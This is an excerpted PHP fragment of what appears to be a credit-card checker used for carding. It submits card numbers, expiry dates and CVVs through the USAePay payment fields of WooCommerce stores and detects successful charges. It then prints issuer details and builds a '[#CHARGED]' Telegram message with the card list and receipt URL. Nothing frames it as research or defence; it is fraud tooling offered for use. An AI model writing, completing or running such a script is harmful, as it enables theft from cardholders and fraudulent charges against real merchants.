...
$paymentMethods = [
    ...
    'usa_epay_credit_card' => '/<input[^>]*name="payment_method"[^>]*value="usa_epay_credit_card"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'wc-usa-epay-credit-card-account-number' => $cc,
    'wc-usa-epay-credit-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
 //  'wc-first-data-clover-credit-card-exp-year' => $mes_with_zero . ' / ' . $ano_no_20,
    'wc-usa-epay-credit-card-csc' =>  $cvv,
...
if (strpos($hostname, 'http://') === false && strpos($hostname, 'https://') === false) {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED USAEPAY CC]
    \n[$hostname1]
    \n[$receiptUrl]\n";
